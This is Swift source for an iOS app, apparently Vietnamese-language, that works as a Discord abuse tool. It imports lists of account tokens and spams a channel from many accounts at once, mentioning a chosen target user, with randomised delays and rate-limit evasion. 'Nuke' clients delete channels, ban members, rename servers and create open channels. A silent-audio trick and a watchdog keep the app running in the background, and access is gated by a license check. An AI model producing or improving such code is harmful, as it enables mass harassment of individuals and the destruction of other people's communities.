    }

    var isKeepAliveActive: Bool {
        lock.lock()
        let active = !activeTags.isEmpty
        lock.unlock()
        return active
    }

    /// Tạo buffer WAV PCM 16-bit im lặng dài 1 giây (44.1kHz Mono) để AVAudioPlayer lặp vô hạn trên iOS background
    private static func makeSilentWavData() -> Data {
        let sampleRate: UInt32 = 44100
        let numChannels: UInt16 = 1
        let bitsPerSample: UInt16 = 16
        let numSamples = Int(sampleRate)
        let dataSize = UInt32(numSamples * Int(numChannels) * Int(bitsPerSample / 8))
        let chunkSize = 36 + dataSize

        var d = Data(capacity: 44 + Int(dataSize))
        func appendLE16(_ v: UInt16) {
            d.append(UInt8(v & 0xFF))
            d.append(UInt8((v >> 8) & 0xFF))
        }
        func appendLE32(_ v: UInt32) {
            d.append(UInt8(v & 0xFF))
            d.append(UInt8((v >> 8) & 0xFF))
            d.append(UInt8((v >> 16) & 0xFF))
            d.append(UInt8((v >> 24) & 0xFF))
        }

        d.append(contentsOf: [0x52, 0x49, 0x46, 0x46]) // RIFF
        appendLE32(chunkSize)
        d.append(contentsOf: [0x57, 0x41, 0x56, 0x45]) // WAVE
        d.append(contentsOf: [0x66, 0x6D, 0x74, 0x20]) // fmt
        appendLE32(16)
        appendLE16(1) // PCM
        appendLE16(numChannels)
        appendLE32(sampleRate)
        appendLE32(sampleRate * UInt32(numChannels) * UInt32(bitsPerSample / 8))
        appendLE16(numChannels * (bitsPerSample / 8))
        appendLE16(bitsPerSample)
        d.append(contentsOf: [0x64, 0x61, 0x74, 0x61]) // data
        appendLE32(dataSize)
        d.append(Data(count: Int(dataSize)))
        return d
    }

    private func installObservers() {
        guard !observersInstalled else { return }
        observersInstalled = true
        let nc = NotificationCenter.default

        nc.addObserver(forName: AVAudioSession.interruptionNotification, object: nil, queue: .main) { [weak self] note in
            guard let self = self, self.isKeepAliveActive else { return }
            let typeVal = note.userInfo?[AVAudioSessionInterruptionTypeKey] as? UInt
            let type = typeVal.flatMap { AVAudioSession.InterruptionType(rawValue: $0) }
            if type == .ended {
                self.ensureRunning()
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.6) { [weak self] in
                    guard let self = self, self.isKeepAliveActive else { return }
                    self.ensureRunning()
                }
            }
        }

        nc.addObserver(forName: AVAudioSession.routeChangeNotification, object: nil, queue: .main) { [weak self] _ in
            guard let self = self, self.isKeepAliveActive else { return }
            self.ensureRunning()
        }

        nc.addObserver(forName: AVAudioSession.mediaServicesWereResetNotification, object: nil, queue: .main) { [weak self] _ in
            guard let self = self, self.isKeepAliveActive else { return }
            self.rebuildAudioPipeline()
        }

        nc.addObserver(forName: UIApplication.didEnterBackgroundNotification, object: nil, queue: .main) { [weak self] _ in
            guard let self = self, self.isKeepAliveActive else { return }
            self.beginTransientBgTask()
            self.ensureRunning()
        }

        nc.addObserver(forName: UIApplication.willEnterForegroundNotification, object: nil, queue: .main) { [weak self] _ in
            guard let self = self, self.isKeepAliveActive else { return }
            self.endTransientBgTask()
            self.ensureRunning()
        }
    }

    /// Xin background task ngắn hạn để chuyển trạng thái mượt — KHÔNG gọi stop() khi hết 30s!
    private func beginTransientBgTask() {
        DispatchQueue.main.async {
            if self.bgTask != .invalid {
                UIApplication.shared.endBackgroundTask(self.bgTask)
                self.bgTask = .invalid
            }
            self.bgTask = UIApplication.shared.beginBackgroundTask(withName: "DiscordStreamKeepAlive") { [weak self] in
                guard let self = self else { return }
                if self.bgTask != .invalid {
                    UIApplication.shared.endBackgroundTask(self.bgTask)
                    self.bgTask = .invalid
                }
                if self.isKeepAliveActive {
                    self.ensureRunning()
                }
            }
        }
    }

    private func endTransientBgTask() {
        DispatchQueue.main.async {
            if self.bgTask != .invalid {
                UIApplication.shared.endBackgroundTask(self.bgTask)
                self.bgTask = .invalid
            }
        }
    }

    func audioSessionOptions() -> AVAudioSession.CategoryOptions {
        let exclusive = UserDefaults.standard.object(forKey: "QT_ExclusiveNowPlaying") == nil
            ? true
            : UserDefaults.standard.bool(forKey: "QT_ExclusiveNowPlaying")
        if exclusive {
            // Không dùng .mixWithOthers để iOS luôn cấp quyền hiển thị Widget Phát Nhạc trên Màn hình khóa & Dynamic Island
            return [.allowAirPlay, .allowBluetoothA2DP]
        }
        return [.mixWithOthers, .allowAirPlay, .allowBluetoothA2DP]
    }

    func applyAudioSessionCategory() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, mode: .default, options: audioSessionOptions())
            try session.setActive(true, options: [])
        } catch {
            print("[BG] AVAudioSession WARN: \(error)")
        }
    }

    func reconfigureAudioSession() {
        DispatchQueue.main.async {
            self.applyAudioSessionCategory()
            if self.isKeepAliveActive {
                self.silentPlayer?.play()
                if let eng = self.engine, !eng.isRunning {
                    try? eng.start()
                }
                Task { @MainActor in
                    NowPlayingHelper.shared.refreshNowPlaying()
                }
            }
        }
    }

    func start(tag: String = "default") {
        lock.lock()
        activeTags.insert(tag)
        lock.unlock()
        ensureRunning()
        startWatchdog()
    }

    func ensureRunning() {
        let work = {
            guard self.isKeepAliveActive else { return }

            self.applyAudioSessionCategory()

            if self.silentPlayer == nil {
                if let player = try? AVAudioPlayer(data: BackgroundManager.makeSilentWavData()) {
                    player.numberOfLoops = -1
                    player.volume = 0.001
                    player.prepareToPlay()
                    self.silentPlayer = player
                }
            }
            if let player = self.silentPlayer, !player.isPlaying {
                player.play()
            }

            if self.engine == nil {
                let eng = AVAudioEngine()
                let format = AVAudioFormat(standardFormatWithSampleRate: 44100, channels: 1)!
                let node = AVAudioSourceNode { _, _, frameCount, audioBufferList -> OSStatus in
                    let abl = UnsafeMutableAudioBufferListPointer(audioBufferList)
                    for buf in abl {
                        if let ptr = buf.mData?.assumingMemoryBound(to: Float.self) {
                            memset(ptr, 0, Int(frameCount) * MemoryLayout<Float>.size)
                        }
                    }
                    return noErr
                }
                eng.attach(node)
                eng.connect(node, to: eng.mainMixerNode, format: format)
                eng.mainMixerNode.outputVolume = 0.001
                self.engine = eng
                self.sourceNode = node
            }
            if let eng = self.engine, !eng.isRunning {
                try? eng.start()
            }
        }
        if Thread.isMainThread {
            work()
        } else {
            DispatchQueue.main.async(execute: work)
        }
    }

    private func rebuildAudioPipeline() {
        silentPlayer?.stop()
        silentPlayer = nil
        engine?.stop()
        engine = nil
        sourceNode = nil
        ensureRunning()
    }

    private func startWatchdog() {
        DispatchQueue.main.async {
            if self.watchdogTimer != nil { return }
            self.watchdogTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { [weak self] _ in
                guard let self = self else { return }
                if self.isKeepAliveActive {
                    let playerAlive = self.silentPlayer?.isPlaying == true
                    let engineAlive = self.engine?.isRunning == true
                    if !playerAlive || !engineAlive {
                        self.ensureRunning()
                    }
                } else {
                    self.watchdogTimer?.invalidate()
                    self.watchdogTimer = nil
                }
            }
        }
    }

    func stop(tag: String = "default") {
        lock.lock()
        activeTags.remove(tag)
        let shouldShutdown = activeTags.isEmpty
        lock.unlock()
        if shouldShutdown {
            stopAll()
        }
    }

    func stopAll() {
        lock.lock()
        activeTags.removeAll()
        lock.unlock()
        DispatchQueue.main.async {
            self.watchdogTimer?.invalidate()
            self.watchdogTimer = nil
            self.silentPlayer?.stop()
            self.silentPlayer = nil
            self.engine?.stop()
            self.engine = nil
            self.sourceNode = nil
            if self.bgTask != .invalid {
                UIApplication.shared.endBackgroundTask(self.bgTask)
                self.bgTask = .invalid
            }
        }
    }
}

// ==========================================
// MARK: - DISCORD CLIENT (SPAM)
// ==========================================
class DiscordClient {
    let token: String
    let scope: FeatureScope
    let session: URLSession

    init(token: String, scope: FeatureScope = .spam) {
        self.token = token
        self.scope = scope
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 20
        cfg.timeoutIntervalForResource = 30
        cfg.httpAdditionalHeaders = RemoteFeatureVault.shared.desktopHeaders(scope: scope, token: token)
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse, (200...299).contains(h.statusCode) else {
            throw NSError(domain: "Remote", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
                          userInfo: [NSLocalizedDescriptionKey: String(data: data, encoding: .utf8) ?? ""])
        }
    }
    private func requireURL(_ route: KeyPath<RemoteRoutesDTO, String?>, replacements: [String: String] = [:]) throws -> URL {
        guard SecurityGuard.shared.verifyExecutionPermit(),
              let url = RemoteFeatureVault.shared.makeURL(scope: scope, route: route, replacements: replacements) else {
            throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chưa xác thực chức năng từ máy chủ."])
        }
        return url
    }
    func validateToken() async throws -> DiscordUser {
        let url = try requireURL(\.me)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getAllGuilds() async throws -> [Guild] {
        let url = try requireURL(\.me_guilds)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getAllChannels(guildId: String) async throws -> [Channel] {
        let url = try requireURL(\.guild_channels, replacements: ["guild_id": guildId])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func sendMessage(channelId: String, content: String) async throws {
        let url = try requireURL(\.channel_messages, replacements: ["channel_id": channelId])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.timeoutInterval = 20
        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        var attempts = 0
        while attempts < 6 {
            attempts += 1
            let (d, r) = try await session.data(for: req)
            if let h = r as? HTTPURLResponse, h.statusCode == 429,
               let j = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
               let retry = j["retry_after"] as? Double {
                let wait = min(max(retry, 0.2), 10.0) + 0.3
                try await Task.sleep(nanoseconds: UInt64(wait * 1_000_000_000))
                continue
            }
            try check(r, d)
            return
        }
        throw NSError(domain: "Remote", code: 429,
                      userInfo: [NSLocalizedDescriptionKey: "Rate limit kéo dài"])
    }
}

// ==========================================
// MARK: - APP STATE (SPAM)
// ==========================================
@MainActor
class AppState: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var activeToken: TokenInfo? = nil
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isCheckingToken = false
    @Published var guilds: [Guild] = []
    @Published var multiGuilds: [Guild] = []
    @Published var channels: [Channel] = []
    @Published var isLoading = false
    @Published var delaySeconds: Double = 2.0
    @Published var useTag = true
    @Published var targetUserId = ""
    @Published var addPrefix = false
    @Published var addSuffix = false
    @Published var inputText = ""
    @Published var messages: [ParsedMessage] = []
    @Published var isSending = false
    @Published var isPausedSending = false
    @Published var totalSent = 0
    @Published var currentMessageStr = ""
    @Published var tokenSendCount: [UUID: Int] = [:]
    @Published var lastError: String?

    private var isCancelled = false
    private var sendTask: Task<Void, Never>?
    private var lastNPUpdate = Date.distantPast
    private var activeSpamChannelName = ""

    init() { loadTokens() }
    private func saveTokens() {
        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: "SavedTokens") }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: "SavedTokens"),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
            tokens = s
            if let a = s.first(where: { $0.isValid }) {
                activeToken = a
                selectedTokenIds = [a.id]
            }
        }
    }
    func addToken(_ s: String, skipAuthCheck: Bool = false) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty, !tokens.contains(where: { $0.token == c }) else { return }
        if !skipAuthCheck {
            guard await LicenseManager.shared.authorizeFeature(.tokens) else {
                lastError = "Xác thực bản quyền thất bại."
                return
            }
        }
        isCheckingToken = true
        do {
            let u = try await DiscordClient(token: c, scope: .tokens).validateToken()
            let t = TokenInfo(token: c, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true)
            tokens.append(t)
            if activeToken == nil {
                activeToken = t
                selectedTokenIds.insert(t.id)
            }
            await recomputeMultiGuilds()
        } catch {
            tokens.append(TokenInfo(token: c, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
        }
        isCheckingToken = false
    }
    func addTokensFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { lastError = "Không đọc file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { lastError = "File rỗng"; return }
        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
        let lines = clean.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        guard !lines.isEmpty else { return }
        guard await LicenseManager.shared.authorizeFeature(.tokens) else {
            lastError = "Xác thực bản quyền thất bại."
            return
        }
        if lines.count > 1 {
            BackgroundManager.shared.start(tag: "tokenCheck")
            NowPlayingHelper.shared.registerSession(
                NowPlayingSessionState(
                    feature: .tokenCheck,
                    title: "Kiểm tra \(lines.count) Token",
                    detail: "0/\(lines.count) đã kiểm tra",
                    controlsHint: "Đang import & check danh sách Token",
                    isPaused: false,
                    elapsedTime: 0,
                    duration: Double(lines.count),
                    isLiveStream: false
                ),
                focus: true
            )
        }
        defer {
            if lines.count > 1 {
                NowPlayingHelper.shared.endSession(.tokenCheck)
                BackgroundManager.shared.stop(tag: "tokenCheck")
            }
        }
        for (idx, l) in lines.enumerated() {
            await addToken(l, skipAuthCheck: true)
            if lines.count > 1 {
                NowPlayingHelper.shared.updateSession(
                    .tokenCheck,
                    detail: "\(idx + 1)/\(lines.count) token đã kiểm tra",
                    elapsedTime: Double(idx + 1),
                    duration: Double(lines.count),
                    isLiveStream: false
                )
            }
        }
        lastError = nil
    }
    func selectAllValidTokens() {
        let validIds = tokens.filter { $0.isValid }.map { $0.id }
        selectedTokenIds = Set(validIds)
        activeToken = tokens.first(where: { $0.isValid })
        Task { await recomputeMultiGuilds() }
    }
    func clearTokenSelection() {
        selectedTokenIds.removeAll()
        activeToken = nil
        guilds = []
        multiGuilds = []
    }
    func removeToken(id: UUID) {
        if let idx = tokens.firstIndex(where: { $0.id == id }) {
            deleteToken(at: IndexSet(integer: idx))
        }
    }
    func setActiveToken(_ t: TokenInfo) {
        guard t.isValid else { return }
        activeToken = t
        selectedTokenIds = [t.id]
        Task { await recomputeMultiGuilds() }
    }
    func toggleTokenSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) {
            selectedTokenIds.remove(t.id)
        } else {
            selectedTokenIds.insert(t.id)
        }
        activeToken = tokens.first(where: { selectedTokenIds.contains($0.id) })
        Task { await recomputeMultiGuilds() }
    }
    func deleteToken(at off: IndexSet) {
        let deleted = off.map { tokens[$0] }
        if let a = activeToken, deleted.contains(where: { $0.id == a.id }) {
            activeToken = nil; guilds = []; multiGuilds = []
        }
        selectedTokenIds.subtract(deleted.map { $0.id })
        tokens.remove(atOffsets: off)
        Task { await recomputeMultiGuilds() }
    }
    func loadGuilds() async { await recomputeMultiGuilds() }

    func recomputeMultiGuilds() async {
        let selected = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        if selected.isEmpty {
            multiGuilds = []; guilds = []; return
        }
        isLoading = true
        defer { isLoading = false }

        guard await LicenseManager.shared.authorizeFeature(.spam) else {
            multiGuilds = []; guilds = []; return
        }

        var sets: [Set<String>] = []
        var guildMap: [String: Guild] = [:]

        await withTaskGroup(of: [Guild]?.self) { group in
            for t in selected {
                group.addTask {
                    do { return try await DiscordClient(token: t.token, scope: .spam).getAllGuilds() }
                    catch { return nil }
                }
            }
            for await gs in group {
                guard let gs = gs else { continue }
                sets.append(Set(gs.map { $0.id }))
                for g in gs { guildMap[g.id] = g }
            }
        }

        if sets.isEmpty { multiGuilds = []; guilds = []; return }

        if selected.count == 1, let firstSet = sets.first {
            let single = firstSet.compactMap { guildMap[$0] }.sorted { $0.name < $1.name }
            guilds = single; multiGuilds = single
            return
        }

        var inter = sets[0]
        for s in sets.dropFirst() { inter.formIntersection(s) }
        let result = inter.compactMap { guildMap[$0] }.sorted { $0.name < $1.name }
        multiGuilds = result; guilds = result
    }

    func loadChannels(for g: Guild) async {
        let selected = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard let first = selected.first else { return }
        isLoading = true
        guard await LicenseManager.shared.authorizeFeature(.spam) else {
            isLoading = false
            return
        }
        do {
            let all = try await DiscordClient(token: first.token, scope: .spam).getAllChannels(guildId: g.id)
            channels = all.filter { $0.isSendableText || $0.isCategory }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
        } catch { lastError = error.localizedDescription }
        isLoading = false
    }
    func groupedChannels() -> [(category: Channel?, items: [Channel])] {
        var r: [(Channel?, [Channel])] = []
        let o = channels.filter { $0.isSendableText && $0.parentId == nil }
        if !o.isEmpty { r.append((nil, o)) }
        for c in channels where c.isCategory {
            let k = channels.filter { $0.isSendableText && $0.parentId == c.id }
            if !k.isEmpty { r.append((c, k)) }
        }
        return r
    }
    func parseFile(url: URL) {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?; var err: String?
        let co = NSFileCoordinator(); var ce: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &ce) { u in
            do { data = try Data(contentsOf: u) } catch { err = error.localizedDescription }
        }
        if data == nil { do { data = try Data(contentsOf: url) } catch { err = error.localizedDescription } }
        guard let d = data else { lastError = "Không đọc file: \(err ?? "")"; return }
        var c: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { c = s; break }
        }
        if c == nil || c!.isEmpty { c = String(decoding: d, as: UTF8.self) }
        guard let fc = c, !fc.isEmpty else { lastError = "File rỗng"; return }
        inputText = fc.replacingOccurrences(of: "\u{FEFF}", with: "")
        parseDirectInput(); lastError = nil
    }
    func parseDirectInput() {
        messages = inputText.components(separatedBy: .newlines).compactMap {
            let t = $0.trimmingCharacters(in: .whitespacesAndNewlines)
            return t.isEmpty ? nil : ParsedMessage(body: t)
        }
    }

    func startSending(channel: Channel) {
        let selectedTokens = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !selectedTokens.isEmpty, !messages.isEmpty else { return }
        if useTag && targetUserId.isEmpty { return }

        isSending = true
        isPausedSending = false
        isCancelled = false
        totalSent = 0
        lastError = nil
        activeSpamChannelName = channel.displayName
        tokenSendCount = Dictionary(uniqueKeysWithValues: selectedTokens.map { ($0.id, 0) })
        let channelId = channel.id
        let totalTokens = selectedTokens.count

        BackgroundManager.shared.start(tag: "spam")
        NowPlayingHelper.shared.registerSession(
            NowPlayingSessionState(
                feature: .spam,
                title: "Spam • #\(channel.displayName)",
                detail: "0 tin • \(totalTokens) token • Delay \(String(format: "%.1fs", delaySeconds))",
                controlsHint: "⏸ Tạm dừng/Tiếp tục • ◀◀/▶▶ Chỉnh Delay",
                isPaused: false,
                elapsedTime: 0,
                duration: 0,
                isLiveStream: true,
                onPlay: { [weak self] in self?.resumeSending() },
                onPause: { [weak self] in self?.pauseSending() },
                onStop: { [weak self] in self?.stopSending() },
                onNext: { [weak self] in self?.adjustDelay(delta: -0.2) },
                onPrevious: { [weak self] in self?.adjustDelay(delta: 0.2) }
            ),
            focus: true
        )

        sendTask = Task { [weak self] in
            guard let self = self else { return }
            let ok = await LicenseManager.shared.authorizeFeature(.spam)
            guard ok else {
                self.lastError = "Xác thực key thất bại — không thể bắt đầu gửi tin."
                self.isSending = false
                self.isPausedSending = false
                BackgroundManager.shared.stop(tag: "spam")
                NowPlayingHelper.shared.endSession(.spam)
                return
            }
            await withTaskGroup(of: Void.self) { group in
                for (index, token) in selectedTokens.enumerated() {
                    group.addTask { [weak self] in
                        guard let self = self else { return }
                        await self.spamLoop(token: token, channelId: channelId, startIndex: index, step: totalTokens)
                    }
                }
            }
            self.isSending = false
            self.isPausedSending = false
            self.currentMessageStr = ""
            BackgroundManager.shared.stop(tag: "spam")
            NowPlayingHelper.shared.endSession(.spam)
        }
    }

    private func spamLoop(token: TokenInfo, channelId: String, startIndex: Int, step: Int) async {
        var client = DiscordClient(token: token.token, scope: .spam)
        var i = startIndex
        var consecutiveErrors = 0
        var perTokenTotal = 0

        while !isCancelled && !Task.isCancelled {
            if isPausedSending {
                try? await Task.sleep(nanoseconds: 200_000_000)
                continue
            }
            let m = messages[i % messages.count]
            var p = ""
            if addPrefix { p += "> " }
            if addSuffix { p += "# " }
            var fc = p + m.body
            if useTag { fc += " <@\(targetUserId)>" }

            do {
                try await client.sendMessage(channelId: channelId, content: fc)
                consecutiveErrors = 0
                totalSent += 1
                perTokenTotal += 1
                tokenSendCount[token.id] = perTokenTotal
                currentMessageStr = fc
                updateNowPlaying()
            } catch {
                consecutiveErrors += 1
                if consecutiveErrors >= 2 {
                    do {
                        _ = try await DiscordClient(token: token.token, scope: .spam).validateToken()
                        client = DiscordClient(token: token.token, scope: .spam)
                        consecutiveErrors = 0
                        try? await Task.sleep(nanoseconds: 800_000_000)
                    } catch {
                        return
                    }
                } else {
                    try? await Task.sleep(nanoseconds: 1_200_000_000)
                }
                continue
            }

            i += step
            let d = max(0.1, delaySeconds + Double.random(in: -0.3...0.3) * delaySeconds)
            do { try await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) } catch { break }
        }
    }

    func pauseSending() {
        guard isSending else { return }
        isPausedSending = true
        updateNowPlaying(force: true)
    }

    func resumeSending() {
        guard isSending else { return }
        isPausedSending = false
        updateNowPlaying(force: true)
    }

    func adjustDelay(delta: Double) {
        let rounded = ((delaySeconds + delta) * 10.0).rounded() / 10.0
        delaySeconds = min(5.0, max(0.1, rounded))
        updateNowPlaying(force: true)
    }

    func stopSending() {
        isCancelled = true
        isPausedSending = false
        sendTask?.cancel()
        sendTask = nil
        isSending = false
        BackgroundManager.shared.stop(tag: "spam")
        NowPlayingHelper.shared.endSession(.spam)
    }

    private func updateNowPlaying(force: Bool = false) {
        let now = Date()
        guard force || now.timeIntervalSince(lastNPUpdate) >= 0.5 else { return }
        lastNPUpdate = now
        let titlePrefix = isPausedSending ? "Tạm dừng" : "Spam"
        NowPlayingHelper.shared.updateSession(
            .spam,
            title: "\(titlePrefix) • #\(activeSpamChannelName)",
            detail: "\(totalSent) tin • \(selectedTokenIds.count) token • Delay \(String(format: "%.1fs", delaySeconds))",
            isPaused: isPausedSending
        )
    }

    func hideKeyboard() { UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil) }
}

// ==========================================
// MARK: - BOT CLIENT
// ==========================================
class BotClient {
    let session: URLSession
    static var EVERYONE_ALLOW: UInt64 { RemoteFeatureVault.shared.everyoneAllow(scope: .botNuke) }
    init(token: String) {
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = RemoteFeatureVault.shared.botHeaders(scope: .botNuke, rawToken: token)
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "B", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    private func requireURL(_ route: KeyPath<RemoteRoutesDTO, String?>, replacements: [String: String] = [:]) throws -> URL {
        guard SecurityGuard.shared.verifyExecutionPermit(),
              let url = RemoteFeatureVault.shared.makeURL(scope: .botNuke, route: route, replacements: replacements) else {
            throw NSError(domain: "B", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chưa xác thực chức năng từ máy chủ."])
        }
        return url
    }
    func validate() async throws -> BotInfo {
        let url = try requireURL(\.me)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode(BotInfo.self, from: d)
    }
    func getGuilds() async throws -> [Guild] {
        let url = try requireURL(\.me_guilds)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let url = try requireURL(\.guild, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, userId: String) async throws -> BotMember {
        let url = try requireURL(\.guild_member, replacements: ["guild_id": g, "user_id": userId])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getMembers(_ g: String, after: String = "0") async throws -> [BotMember] {
        let url = try requireURL(\.guild_members, replacements: ["guild_id": g, "after": after])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([BotMember].self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        let url = try requireURL(\.channel, replacements: ["channel_id": c])
        var req = URLRequest(url: url)
        req.httpMethod = "DELETE"
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        let url = try requireURL(\.channel_messages, replacements: ["channel_id": c])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        let url = try requireURL(\.guild, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, userId: String) async throws {
        let url = try requireURL(\.guild_ban, replacements: ["guild_id": g, "user_id": userId])
        var req = URLRequest(url: url)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
}

// ==========================================
// MARK: - USER NUKE CLIENT
// ==========================================
class UserNukeClient {
    let token: String
    let scope: FeatureScope
    let session: URLSession
    var everyoneAllow: UInt64 { RemoteFeatureVault.shared.everyoneAllow(scope: scope) }

    init(token: String, scope: FeatureScope = .userNuke) {
        self.token = token
        self.scope = scope
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest = 30
        cfg.httpAdditionalHeaders = RemoteFeatureVault.shared.mobileHeaders(scope: scope, token: token)
        session = URLSession(configuration: cfg)
    }
    private func check(_ res: URLResponse, _ data: Data) throws {
        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
        guard (200...299).contains(h.statusCode) else {
            throw NSError(domain: "UN", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
        }
    }
    private func requireURL(_ route: KeyPath<RemoteRoutesDTO, String?>, replacements: [String: String] = [:]) throws -> URL {
        guard SecurityGuard.shared.verifyExecutionPermit(),
              let url = RemoteFeatureVault.shared.makeURL(scope: scope, route: route, replacements: replacements) else {
            throw NSError(domain: "UN", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chưa xác thực chức năng từ máy chủ."])
        }
        return url
    }
    func validate() async throws -> DiscordUser {
        let url = try requireURL(\.me)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
    }
    func getGuildsWithPerms() async throws -> [NukeGuild] {
        let url = try requireURL(\.me_guilds)
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
